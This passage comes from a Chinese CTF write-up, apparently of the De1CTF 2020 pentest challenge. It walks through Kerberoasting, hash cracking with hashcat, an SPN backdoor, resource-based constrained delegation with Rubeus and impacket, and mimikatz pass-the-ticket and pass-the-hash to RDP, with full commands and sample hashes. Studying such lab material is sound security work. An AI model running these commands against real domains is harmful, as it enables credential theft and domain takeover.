RestrictedKrbHost&#x2F;COMPUTER01.test.com</span><br><span class="line">        HOST&#x2F;COMPUTER01.test.com</span><br><span class="line">CN&#x3D;MSSQL Service Admin,CN&#x3D;Users,DC&#x3D;test,DC&#x3D;com</span><br><span class="line">        MSSQLSvc&#x2F;DC1.test.com</span><br></pre></td></tr></table></figure>

<p>以CN开头的每一行代表一个帐户，其下的信息是与该帐户相关联的SPN</p>
<p>对于上面的输出数据，机器帐户(Computers)为：</p>
<ul>
<li>CN=DC1,OU=Domain Controllers,DC=test,DC=com</li>
<li>CN=COMPUTER01,CN=Computers,DC=test,DC=com</li>
</ul>
<p>域用户帐户(Users)为：</p>
<ul>
<li>CN=krbtgt,CN=Users,DC=test,DC=com</li>
<li>CN=MSSQL Service Admin,CN=Users,DC=test,DC=com</li>
</ul>
<p>注册在域用户帐户(Users)下的SPN有两个：<code>kadmin/changepw</code>和<code>MSSQLSvc/DC1.test.com</code></p>
<h2 id="0x03-Kerberoasting的原理"><a href="#0x03-Kerberoasting的原理" class="headerlink" title="0x03 Kerberoasting的原理"></a>0x03 Kerberoasting的原理</h2><hr>
<h4 id="1、Kerberos认证过程"><a href="#1、Kerberos认证过程" class="headerlink" title="1、Kerberos认证过程"></a>1、Kerberos认证过程</h4><p>一个简单的Kerberos认证过程如下图</p>
<p><img src="/2020/05/09/De1ctf-pentest2/2-1.png" alt="Alt text"></p>
<ol>
<li>as_request</li>
<li>as_reply</li>
<li>tgs_request</li>
<li>tgs_reply</li>
<li>ap_request</li>
<li>ap_reply</li>
</ol>
<p>对于4.tgs_reply，用户将会收到由目标服务实例的NTLM hash加密生成的TGS(service ticket)，加密算法为<code>RC4-HMAC</code></p>
<p>站在利用的角度，当获得这个TGS后，我们可以尝试穷举口令，模拟加密过程，生成TGS进行比较。如果TGS相同，代表口令正确，就能获得目标服务实例的明文口令</p>
<h4 id="2、Windows系统通过SPN查询获得服务和服务实例帐户的对应关系"><a href="#2、Windows系统通过SPN查询获得服务和服务实例帐户的对应关系" class="headerlink" title="2、Windows系统通过SPN查询获得服务和服务实例帐户的对应关系"></a>2、Windows系统通过SPN查询获得服务和服务实例帐户的对应关系</h4><p>这里举一个例子：</p>
<p>用户a要访问MySQL服务的资源，进行到4.tgs_reply时，步骤如下：</p>
<p>(1)Domain Controller查询MySQL服务的SPN</p>
<p>如果该SPN注册在机器帐户(Computers)下，将会查询所有机器帐户(Computers)的servicePrincipalName属性，找到对应的帐户</p>
<p>如果该SPN注册在域用户帐户(Users)下，将会查询所有域用户(Users)的servicePrincipalName属性，找到对应的帐户</p>
<p>(2)找到对应的帐户后，使用该帐户的NTLM hash，生成TGS</p>
<h4 id="3、域内的主机都能查询SPN"><a href="#3、域内的主机都能查询SPN" class="headerlink" title="3、域内的主机都能查询SPN"></a>3、域内的主机都能查询SPN</h4><h4 id="4、域内的任何用户都可以向域内的任何服务请求TGS"><a href="#4、域内的任何用户都可以向域内的任何服务请求TGS" class="headerlink" title="4、域内的任何用户都可以向域内的任何服务请求TGS"></a>4、域内的任何用户都可以向域内的任何服务请求TGS</h4><p>综上，域内的任何一台主机，都能够通过查询SPN，向域内的所有服务请求TGS，拿到TGS后对其进行暴力破解</p>
<p>对于破解出的明文口令，只有域用户帐户(Users)的口令存在价值，不必考虑机器帐户的口令(无法用于远程连接)</p>
<p>因此，高效率的利用思路如下：</p>
<ol>
<li>查询SPN，找到有价值的SPN，需要满足以下条件：<ul>
<li>该SPN注册在域用户帐户(Users)下</li>
<li>域用户账户的权限很高</li>
</ul>
</li>
<li>请求TGS</li>
<li>导出TGS</li>
<li>暴力破解</li>
</ol>
<h2 id="0x04-Kerberoasting的实现方法一"><a href="#0x04-Kerberoasting的实现方法一" class="headerlink" title="0x04 Kerberoasting的实现方法一"></a>0x04 Kerberoasting的实现方法一</h2><hr>
<h3 id="1、获得有价值的SPN"><a href="#1、获得有价值的SPN" class="headerlink" title="1、获得有价值的SPN"></a>1、获得有价值的SPN</h3><p>需要满足以下条件：</p>
<ul>
<li>该SPN注册在域用户帐户(Users)下</li>
<li>域用户账户的权限很高</li>
</ul>
<p>可以选择以下三种方法：</p>
<h4 id="1-使用powershell模块Active-Directory"><a href="#1-使用powershell模块Active-Directory" class="headerlink" title="(1)使用powershell模块Active Directory"></a>(1)使用powershell模块Active Directory</h4><p><strong>注：</strong></p>
<p>powershell模块Active Directory 需要提前安装，域控制器一般会安装</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import-module ActiveDirectory</span><br><span class="line">get-aduser -filter &#123;AdminCount -eq 1 -and (servicePrincipalName -ne 0)&#125; -prop * |select name,whencreated,pwdlastset,lastlogon</span><br></pre></td></tr></table></figure>

<p>对于未安装Active Directory模块的系统，可以通过如下命令导入Active Directory模块：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import-module .\Microsoft.ActiveDirectory.Management.dll</span><br></pre></td></tr></table></figure>

<p>Microsoft.ActiveDirectory.Management.dll在安装powershell模块Active Directory后生成，我已经提取出来并上传至github：</p>
<p><a href="https://github.com/3gstudent/test/blob/master/Microsoft.ActiveDirectory.Management.dll" target="_blank" rel="noopener">https://github.com/3gstudent/test/blob/master/Microsoft.ActiveDirectory.Management.dll</a></p>
<h4 id="2-使用PowerView"><a href="#2-使用PowerView" class="headerlink" title="(2)使用PowerView"></a>(2)使用PowerView</h4><p><a href="https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1" target="_blank" rel="noopener">https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Get-NetUser -spn -AdminCount|Select name,whencreated,pwdlastset,lastlogon</span><br></pre></td></tr></table></figure>

<h4 id="3-使用kerberoast"><a href="#3-使用kerberoast" class="headerlink" title="(3)使用kerberoast"></a>(3)使用kerberoast</h4><p>powershell:</p>
<p><a href="https://github.com/nidem/kerberoast/blob/master/GetUserSPNs.ps1" target="_blank" rel="noopener">https://github.com/nidem/kerberoast/blob/master/GetUserSPNs.ps1</a></p>
<p>vbs:</p>
<p><a href="https://github.com/nidem/kerberoast/blob/master/GetUserSPNs.vbs" target="_blank" rel="noopener">https://github.com/nidem/kerberoast/blob/master/GetUserSPNs.vbs</a></p>
<p>参数如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cscript GetUserSPNs.vbs</span><br></pre></td></tr></table></figure>

<h3 id="2、请求TGS"><a href="#2、请求TGS" class="headerlink" title="2、请求TGS"></a>2、请求TGS</h3><h4 id="1-请求指定TGS"><a href="#1-请求指定TGS" class="headerlink" title="(1)请求指定TGS"></a>(1)请求指定TGS</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$SPNName &#x3D; &#39;MSSQLSvc&#x2F;DC1.test.com&#39;</span><br><span class="line">Add-Type -AssemblyNAme System.IdentityModel</span><br><span class="line">New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $SPNName</span><br></pre></td></tr></table></figure>

<h4 id="2-请求所有TGS"><a href="#2-请求所有TGS" class="headerlink" title="(2)请求所有TGS"></a>(2)请求所有TGS</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Add-Type -AssemblyName System.IdentityModel  </span><br><span class="line">setspn.exe -q *&#x2F;* | Select-String &#39;^CN&#39; -Context 0,1 | % &#123; New-Object System. IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() &#125;  </span><br></pre></td></tr></table></figure>

<p>执行后输入<code>klist</code>查看内存中的票据，可找到获得的TGS</p>
<h3 id="3、导出"><a href="#3、导出" class="headerlink" title="3、导出"></a>3、导出</h3><p>使用mimikatz</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">kerberos::list &#x2F;export</span><br></pre></td></tr></table></figure>

<h3 id="4、破解"><a href="#4、破解" class="headerlink" title="4、破解"></a>4、破解</h3><p><a href="https://github.com/nidem/kerberoast/blob/master/tgsrepcrack.py" target="_blank" rel="noopener">https://github.com/nidem/kerberoast/blob/master/tgsrepcrack.py</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.&#x2F;tgsrepcrack.py wordlist.txt test.kirbi</span><br></pre></td></tr></table></figure>

<h2 id="0x05-Kerberoasting的实现方法二"><a href="#0x05-Kerberoasting的实现方法二" class="headerlink" title="0x05 Kerberoasting的实现方法二"></a>0x05 Kerberoasting的实现方法二</h2><hr>
<p>自动实现，并且不需要mimikatz，普通用户权限即可，参考资料：</p>
<p><a href="http://www.harmj0y.net/blog/powershell/kerberoasting-without-mimikatz/" target="_blank" rel="noopener">http://www.harmj0y.net/blog/powershell/kerberoasting-without-mimikatz/</a></p>
<p>代码地址：</p>
<p><a href="https://github.com/EmpireProject/Empire/commit/6ee7e036607a62b0192daed46d3711afc65c3921" target="_blank" rel="noopener">https://github.com/EmpireProject/Empire/commit/6ee7e036607a62b0192daed46d3711afc65c3921</a></p>
<p>使用<code>System.IdentityModel.Tokens.KerberosRequestorSecurityToken</code>请求TGS，在返回结果中提取出TGS，输出的TGS可选择John the Ripper或Hashcat进行破解</p>
<p>实例演示：</p>
<p>在域内一台主机上以普通用户权限执行：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Invoke-Kerberoast -AdminCount -OutputFormat Hashcat | fl</span><br></pre></td></tr></table></figure>

<p>-AdminCount表示选择高权限的用户</p>
<p>输出结果如下图</p>
<p><img src="/2020/05/09/De1ctf-pentest2/2-2.png" alt="Alt text"></p>
<p>只提取出hash的参数如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Invoke-Kerberoast -AdminCount -OutputFormat Hashcat | Select hash | ConvertTo-CSV -NoTypeInformation</span><br></pre></td></tr></table></figure>

<p>输出结果如下图</p>
<p><img src="/2020/05/09/De1ctf-pentest2/2-3.png" alt="Alt text"></p>
<p>使用hashcat破解的参数如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hashcat -m 13100 &#x2F;tmp&#x2F;hash.txt &#x2F;tmp&#x2F;password.list -o found.txt --force</span><br></pre></td></tr></table></figure>

<p>破解结果如下图，成功获得明文口令<code>MySQLAdmin111!</code></p>
<p><img src="/2020/05/09/De1ctf-pentest2/2-4.png" alt="Alt text"></p>
<p><strong>注：</strong></p>
<p>Rubeus也可以实现Invoke-Kerberoast的功能，地址如下：</p>
<p><a href="https://github.com/GhostPack/Rubeus" target="_blank" rel="noopener">https://github.com/GhostPack/Rubeus</a></p>
<p>参数如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Rubeus.exe kerberoast</span><br></pre></td></tr></table></figure>

<h2 id="0x06-Kerberoasting的后门利用"><a href="#0x06-Kerberoasting的后门利用" class="headerlink" title="0x06 Kerberoasting的后门利用"></a>0x06 Kerberoasting的后门利用</h2><hr>
<p>在我们取得了SPN的修改权限后，可以为指定的域用户添加一个SPN，这样可以随时获得该域用户的TGS，经过破解后获得明文口令</p>
<p>例如为域用户<code>Administrator</code>添加<code>SPNVNC/DC1.test.com</code>，参数如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">setspn.exe -U -A VNC&#x2F;DC1.test.com Administrator</span><br></pre></td></tr></table></figure>

<p>如下图</p>
<p><img src="/2020/05/09/De1ctf-pentest2/3-1.png" alt="Alt text"></p>
<p>在域内任意一台主机都能获得该SPN，并且能够使用Kerberoast获得TGS，如下图</p>
<p><img src="/2020/05/09/De1ctf-pentest2/3-2.png" alt="Alt text"></p>
<p>再使用hashcat破解即可</p>
<p><strong>补充：</strong></p>
<p>删除SPN的参数如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">setspn.exe -D VNC&#x2F;DC1.test.com Administrator</span><br></pre></td></tr></table></figure>
</blockquote>
<p>这里用rubeus.exe进行Kerberoastong攻击，</p>
<p><img src="/2020/05/09/De1ctf-pentest2/image-20200506201311011.png" alt="image-20200506201311011"></p>
<p>拿到De1ta的spn hash,然后用hashcat暴力破解hash，对应的命令如下，</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hashcat64.exe -a 3 -m 13100 de1ta_spn.txt ?h?h?h?h?h?h?h?h</span><br><span class="line">-a 3 表示掩码攻击 </span><br><span class="line">-m 13100 Kerberos 5 TGS-REP etype 23</span><br><span class="line">后面是掩码字符集</span><br><span class="line">hashcat 用法可以参考https:&#x2F;&#x2F;xz.aliyun.com&#x2F;t&#x2F;4008</span><br></pre></td></tr></table></figure>

<blockquote>
<p><img src="/2020/05/09/De1ctf-pentest2/image-20200506212238198.png" alt="image-20200506212238198"></p>
</blockquote>
<p>还可以这样：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hashcat64.exe -a 3 -m 13100 $krb5tgs$23$*De1ta$De1CTF2020.lab$http&#x2F;DM.De1CTF2020.lab*$61050147501E33CBDD5989D54AF1DF7B$346869F1DD94F400AE5C9925D03AA79F11B114AA6304B1ADAA7527796F7A80B4A21D1C0 FD329739F4572C9F0FC05622195960B66199E632715E616A79A92C3EB2CDF16EBB4A48575B3C6138065B2DCF544550C4A670FC5F3A55E61E2FE66762672ABFB9DA87018D91A2BED79EA50FA2AEB3E710339A2A733DDAEBC9017E49019132F99DCC626444E9F91885F539AB23BBB1AD082446B567B8FD29C72708FE6B56252CEA3BE85EACD0433644E9E99E2C8A8930FBB6043E1CD18054E4C948BBB5F0C5F3C9E2EA85E305079CC8CC38049AF88D37AE6211D75A3D06092350799BFFC23B9C4B1EE2BB1C586241374A23170B8F44E64E7A9B6101B780D28ACE1CB67152D54756EF57C21326E1C96B73680E5D495897F6086BBEDA269013C32C27C9029F11746B2B3F2AADFFB1831FA6761020894A81633FD5F8171D49EFDCEA0F89D696C3901A0A62F533BAC8CEDFD7BA77C6FBE095C1383A177D51C46603BDC236EBEF958FA9955226FDB551C0AC76EBDB4575782E215F7C05B1727107EC4B5468C92D3414BA53659E1A6A53F2E8608D9696AB0E11F32658DD9012AF96B74B2B8DE441FFADA666FA30012636B21C0AD46576F30467FD9C8923BEF4A9F37FCD4142E03423F692E7F9C36BD3626E3AA066C3254EADA1BDEB7B51B2EB256A4B79235D5854401CC9F73290352E550E41CE23C394A93FCBFBE35C398145E75FA64F1CE09A0B866F401B79351122DFCB1096999C879334C8D95F5B41601C713D6DA4ECB024D55680E8E71BED081EA48152561770DE047EBE017B10615A3DF335B3432718E3D000ECBBD21EFECF0D705B15C67763B4841BFA4EE6C78ED823B3A039E159DC16E024972E6EDFC7BE3057DF2EBA5C37274AE8753AA3675E02E5C52F8ABFFAD4B1B2DD97613092269E28370609DC24F295F5B769BED8AB95BE971B12B60608BCFB191BAC206D56AF13D5793B3F795AED53F7DF5D80056BC7799E223F7627EC8572AF324613813A8DBC78CC6DDAF85148A99C05BF802F63E64A77DE4BB9A0DC8B7DCDA97B80CDFCE0138EE81B1808F8F8BB4AAD3EF9CABAE504699F86938325C9D8C181FA66C95C986AE9D34D7B3DD15F2FAA29149815D3581F6462508D81D4A275F128A38C1DC8CEB54C2B8B98445DDE60C7469B598C172278A0BB6E17967998131712B55ACD27F0369133140E57A100CECB2625402F23CA3F246EACEEE638F1BC518CD0EDBA8B94492795833B1DB5D9F7C46DC4EA6014C750276F07190F181951918F028FB0CA4CB1617FC5E5EF7DBCD09D59E26C76B6AA7CC36D5A2EBF8670E018CCC1E3BE7E1D58E6FC798323421A3424562B9E14B325E50B36B14C8A4B3F42B43CF40DD73DF235F1B87FA6F2578767739608791CF4706140F02CE03F523A06069DA1C293E9BED7B188EEF41 -1 0123456789abcdef --increment --increment-min 1 --increment-max 8 ?1?1?1?1?1?1?1?1</span><br></pre></td></tr></table></figure>

<blockquote>
<p><img src="/2020/05/09/De1ctf-pentest2/image-20200506212308372.png" alt="image-20200506212308372"></p>
</blockquote>
<p><img src="/2020/05/09/De1ctf-pentest2/image-20200506224335368.png" alt="image-20200506224335368"></p>
<p>前面已经提示了De1ta有特殊的扩展权限，然后再用adfind去查看De1ta的acl权限</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">AdFind.exe -sc getacls -sddlfilter ;;;;;de1ctf2020\De1ta -recmute</span><br><span class="line">AdFind.exe -s subtree -b "dc=De1CTF2020,dc=lab" -sc getacl -sddl+++ -sddlfilter ;;;;;De1ta -recmute</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/09/De1ctf-pentest2/image-20200506085227520.png" alt="image-20200506085227520"></p>
<p><img src="/2020/05/09/De1ctf-pentest2/image-20200506224719242.png" alt="image-20200506224719242"></p>
<p>可以看到上图框中的三个权限(Add/Remove Replica In Domain、Replication Synchronization、Manage Replication Topology)，大佬说上面三个权限可以进行DCShadow攻击，具体攻击原理可以看<a href="https://blog.riskivy.com/dcshadow/" target="_blank" rel="noopener">https://blog.riskivy.com/dcshadow/</a>这篇文章，</p>
<blockquote>
<p>但是单单三个权限还是不满足Dcshadow的条件的，还要对当前主机属性具有写权限以及对<code>CN=Sites,CN=Configuration,DC=De1CTF2020,DC=lab</code>容器具有<code>Create Child</code>和<code>Delete Chind</code>权限。然后再收集一波相关的ACL</p>
<p>发现De1ta用户对<code>CN=Sites,CN=Configuration,DC=De1CTF2020,DC=lab</code>容器具有<code>Create Child</code>和<code>Delete Chind</code>权限</p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">AdFind.exe -s subtree -b "cn=sites,cn=Configuration,dc=De1CTF2020,dc=lab" -sc getacl -sddl+++ -sddlfilter ;;;;;de1ctf2020\De1ta -recmute</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/09/De1ctf-pentest2/image-20200506225825119.png" alt="image-20200506225825119"></p>
<p>继续查看De1ta对当前主机DM属性具有写权限，</p>
<p><img src="/2020/05/09/De1ctf-pentest2/image-20200509171231727.png" alt></p>
<p>即可进行基于资源的约束委派攻击。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">AdFind.exe -s subtree -b "cn=dm,cn=computers,dc=De1CTF2020,dc=lab" -sc getacl -sddl+++ -sddlfilter ;;;;;de1ctf2020\De1ta -recmute</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/09/De1ctf-pentest2/image-20200506225952439.png" alt="image-20200506225952439"></p>
<p>然后通过基于资源的约束委派对当前主机进行本地提权。<a href="http://redteam.today/2019/10/18/%E7%94%A8%E5%9F%9F%E5%A7%94%E6%B4%BE%E6%89%93%E7%83%82kerberos%E7%8B%97%E5%A4%B4/" target="_blank" rel="noopener">详细原理参考</a>，另外还有视频<a href="https://www.youtube.com/watch?v=RUbADHcBLKg" target="_blank" rel="noopener">操作</a></p>
<p>这里首先用klist purge命令把登录会话的所有票证清空，然后</p>
<blockquote>
<p>klist语法</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">klist [-lh &lt;LogonId.HighPart&gt;] [-li &lt;LogonId.LowPart&gt;] tickets | tgt | purge | sessions | kcd_cache | get | add_bind | query_bind | purge_bind</span><br></pre></td></tr></table></figure>
</blockquote>
<p><img src="/2020/05/09/De1ctf-pentest2/image-20200507230043568.png" alt="image-20200508082613787"></p>
<p>之后请求一个TGT,并导入会话中，</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Rubeus.exe hash &#x2F;user:de1ta &#x2F;password:3f23ea12 &#x2F;domain:De1CTF2020.lab</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/09/De1ctf-pentest2/image-20200508082613787.png" alt></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Rubeus.exe asktgt /user:de1ta /rc4:B03094996601324646AC223BF30D0D07 /ptt</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/09/De1ctf-pentest2/image-20200507225359017.png" alt="image-20200507225359017"></p>
<p>然后klist查询下票据，可以看见</p>
<p><img src="/2020/05/09/De1ctf-pentest2/image-20200507225504011.png" alt="image-20200507225504011"></p>
<p>之后参考这篇<a href="https://xz.aliyun.com/t/7454" target="_blank" rel="noopener">文章</a>，进行基于资源的约束委派攻击，首先使用<a href="https://github.com/Kevin-Robertson" target="_blank" rel="noopener">Kevin-Robertson</a>/<strong><a href="https://github.com/Kevin-Robertson/Powermad" target="_blank" rel="noopener">Powermad</a></strong>来添加一个账号</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">New-MachineAccount -MachineAccount mount -Password $(ConvertTo-SecureString "mount" -AsPlainText -Force)  </span><br><span class="line"><span class="meta">#</span><span class="bash">下图为evil,对应改成mount即可</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/09/De1ctf-pentest2/image-20200507231145442.png" alt="image-20200507231145442"></p>
<p>然后利用powerview的Get-DomainComputer得到mount的sid。</p>
<p><img src="/2020/05/09/De1ctf-pentest2/image-20200508083733914.png" alt="image-20200508083733914"></p>
<p>然后设置DM的msds-allowedtoactonbehalfofotheridentity属性，添加新建的mount，达到可以让mount可以模拟任意用户访问DM的服务，即基于资源的约束委派攻击进行提权。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList <span class="string">"O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-1806179181-549835139-1294087714-1129)"</span>;</span></span><br><span class="line"><span class="meta">$</span><span class="bash">SDBytes = New-Object byte[] (<span class="variable">$SD</span>.BinaryLength);</span></span><br><span class="line"><span class="meta">$</span><span class="bash">SD.GetBinaryForm(<span class="variable">$SDBytes</span>, 0);</span></span><br><span class="line">Get-DomainComputer DM| Set-DomainObject -Set @&#123;'msds-allowedtoactonbehalfofotheridentity'=$SDBytes&#125; -Verbose</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/09/De1ctf-pentest2/image-20200508091157144.png" alt="image-20200508091157144"></p>
<p>可以利用powerview的如下命令来检测是否设置成功，</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">RawBytes = Get-DomainComputer DM -Properties <span class="string">'msds-allowedtoactonbehalfofotheridentity'</span> | select -expand msds-allowedtoactonbehalfofotheridentity; <span class="variable">$Descriptor</span> = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList <span class="variable">$RawBytes</span>,0; <span class="variable">$Descriptor</span>.DiscretionaryAcl</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/09/De1ctf-pentest2/image-20200508100355469.png" alt="image-20200508100355469"></p>
<p>然后在生成对应的白银票据（伪造的tgs）,参考先知的<a href="https://xz.aliyun.com/t/7454" target="_blank" rel="noopener">文章要</a>分别生成（cifs,host）两个票据，这里采用rubeus.exe来进行基于资源的约束委派利用，因为rubeus.exe不支持明文，所以首先生成hash。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Rubeus.exe hash /user:mount /password:mount /domain:De1CTF2020.lab</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/09/De1ctf-pentest2/image-20200508090928722.png" alt="image-20200508090928722"></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Rubeus.exe s4u /user:mount$ /rc4:A7BD777076A164E74E418F0913174929 /impersonateuser:Administrator /msdsspn:cifs/dm /ptt </span><br><span class="line"></span><br><span class="line">Rubeus.exe s4u /user:mount /rc4:A7BD777076A164E74E418F0913174929 /impersonateuser:administrator /msdsspn:host/dm /ptt </span><br><span class="line"><span class="meta">#</span><span class="bash">rubeus的用法参考 https://github.com/GhostPack/Rubeus<span class="comment">#s4u</span></span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/09/De1ctf-pentest2/image-20200508091546798.png" alt="image-20200508091546798"></p>
<p>之后klist检查票据</p>
<p><img src="/2020/05/09/De1ctf-pentest2/image-20200508091629160.png" alt="image-20200508091629160"></p>
<p>然后测试效果</p>
<img src="/2020/05/09/De1ctf-pentest2/image-20200509130415846.png" alt="image-20200509130415846" style="zoom:150%;">

<p>失败，<a href="https://byqiyou.github.io/2020/05/06/De1CTF2020/#Hard-Pentest" target="_blank" rel="noopener">看出题人博客也说</a>rubeus 的不可以，</p>
<img src="/2020/05/09/De1ctf-pentest2/image-20200509130808887.png" alt="image-20200509130808887" style="zoom:150%;">

<p>然后开始用impacket，这里要用pyinstaller把impacket的程序打包，github上面也有现成的，</p>
<blockquote>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">getST.exe -dc-ip 192.168.0.12 -spn cifs/dm -impersonate Administrator de1ctf2020.lab/mount:mount</span><br><span class="line"><span class="meta">$</span><span class="bash">env:KRB5CCNAME=<span class="string">"Administrator.ccache"</span></span></span><br><span class="line">.\wmiexec.exe -no-pass -k dm shell.exe</span><br></pre></td></tr></table></figure>
</blockquote>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">getst.exe -dc-ip 192.168.0.12 -spn cifs/dm -impersonate Administrator de1ctf2020.lab/mount:mount</span><br><span class="line"></span><br><span class="line">setenv KRB5CCNAME  Administrator.ccache</span><br><span class="line"></span><br><span class="line">wmiexec.exe -no-pass -k -debug dm shell.exe</span><br><span class="line"><span class="meta">#</span><span class="bash">或</span></span><br><span class="line">smbexec.exe -no-pass -k -debug dm  </span><br><span class="line"><span class="meta">#</span><span class="bash">或</span></span><br><span class="line">PsExec64.exe  \\dm -s cmd</span><br></pre></td></tr></table></figure>

<blockquote>
<p>参数：</p>
<p>-impersonate：表示伪造用户</p>
<p>-spn：表示我们要委派的服务的spn，这里是cifs</p>
<p>-dc-ip：域控ip</p>
<p>执行之后会在当前目录生成一个缓存文件Administrator.ccache</p>
<p>-no-pass</p>
</blockquote>
<p>执行wmiexec.exe等都没有成功，然后利用mimikatz.exe把Administrator.ccache导入会话，</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">shell mimikatz.exe &quot;privilege::debug&quot;  &quot;kerberos::ptc Administrator.ccache&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/09/De1ctf-pentest2/image-20200509141628302.png" alt="image-20200509141628302"></p>
<p>然后在运行，还是失败，</p>
<p><img src="/2020/05/09/De1ctf-pentest2/image-20200509141847581.png" alt="image-20200509141847581"></p>
<p>出现这个错误原因可能<a href="http://t3ngyu.leanote.com/tag/Pth" target="_blank" rel="noopener">是</a>什么组册表，参考这篇文章，要改注册表，但是无权限，pth吧，没有administrator的hash，爬。</p>
<blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System &#x2F;v LocalAccountTokenFilterPolicy &#x2F;t REG_DWORD &#x2F;d 1 &#x2F;f </span><br></pre></td></tr></table></figure>
</blockquote>
<p>之后尝试内网穿透，用frp挂上代理，然后，还是失败，好像本地解析不了dm，</p>
<p><img src="/2020/05/09/De1ctf-pentest2/image-20200509143858857.png" alt="image-20200509143858857"></p>
<p>然后就没办法复现下去了，有师傅做出来的可以评论告诉我这个菜鸡，我哪里除了问题，太菜了。</p>
<p>之后参考了n1nty大佬(<a href="https://mp.weixin.qq.com/s/gw1EIMnXQ9tCZLkdvKdzAg)[文章](https://paper.seebug.org/620/#s4u-service-for-user)" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/gw1EIMnXQ9tCZLkdvKdzAg)[文章](https://paper.seebug.org/620/#s4u-service-for-user)</a></p>
<blockquote>
<p><img src="/2020/05/09/De1ctf-pentest2/image-20200509193504323.png" alt="image-20200509193504323"></p>
</blockquote>
<p>然后在我的虚拟机/etc/hosts 添加了 192.168.0.12 dm ,然而并没有解决问题，之后就开始搜索proxychains dns解析的东西，是proxyresolv，开始它是这样的</p>
<p><img src="/2020/05/09/De1ctf-pentest2/image-20200509193855651.png" alt="image-20200509193855651"></p>
<p>看上面之所以失败就是这里的4.2.2.2不能解析dm,然后我们需要解析dm为192.168.0.12，这里图简单然后就无脑地让程序输出192.168.0.12就可以了，，，，</p>
<p><img src="/2020/05/09/De1ctf-pentest2/image-20200509194940263.png" alt="image-20200509194940263"></p>
<p>然后还是之前的一套流程，用wmiexec.py还是不成功，然后试了试smbexec.py，然后就可以了，</p>
<p><img src="/2020/05/09/De1ctf-pentest2/image-20200509195542165.png" alt="image-20200509195542165"></p>
<p>之后退出过一回，在用smbexec.py就报错了，什么服务已存在，然后就只能用acexec.py来执行单条命令了，然后生成一个后门执行后在cs得到一个system权限的shell。</p>
<p><img src="/2020/05/09/De1ctf-pentest2/image-20200509200703281.png" alt="image-20200509200703281"></p>
<p>进行DCShadow攻击需要打开两个mimikatz窗口，然后开启远程桌面（也可以不开远程桌面，可以参考出题人<a href="https://byqiyou.github.io/2020/05/06/De1CTF2020/#Hard-Pentest" target="_blank" rel="noopener">博客</a>），这里利用<a href="https://github.com/fatedier/frp" target="_blank" rel="noopener">frp</a>进行代理，frp使用请看另一篇文章，代理设置好之后，就可以利用这篇文章提到的<a href="https://www.secpulse.com/archives/72190.html" target="_blank" rel="noopener">Pass the Hash with Remote Desktop</a>利用ntlm直接登录远程桌面</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">sekurlsa::pth &#x2F;user:administrator &#x2F;domain:DM &#x2F;ntlm:cf3c7280c8c3d3fcce24e9e7289ddd10 &quot;&#x2F;run:mstsc.exe &#x2F;restrictedadmin&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/09/De1ctf-pentest2/image-20200506151539110.png" alt="image-20200506151539110"></p>
<blockquote>
<p>Restricted Admin mode，直译为受限管理模式，主要功能是使得凭据不会暴露在目标系统中</p>
<h3 id="适用系统"><a href="#适用系统" class="headerlink" title="适用系统"></a>适用系统</h3><ul>
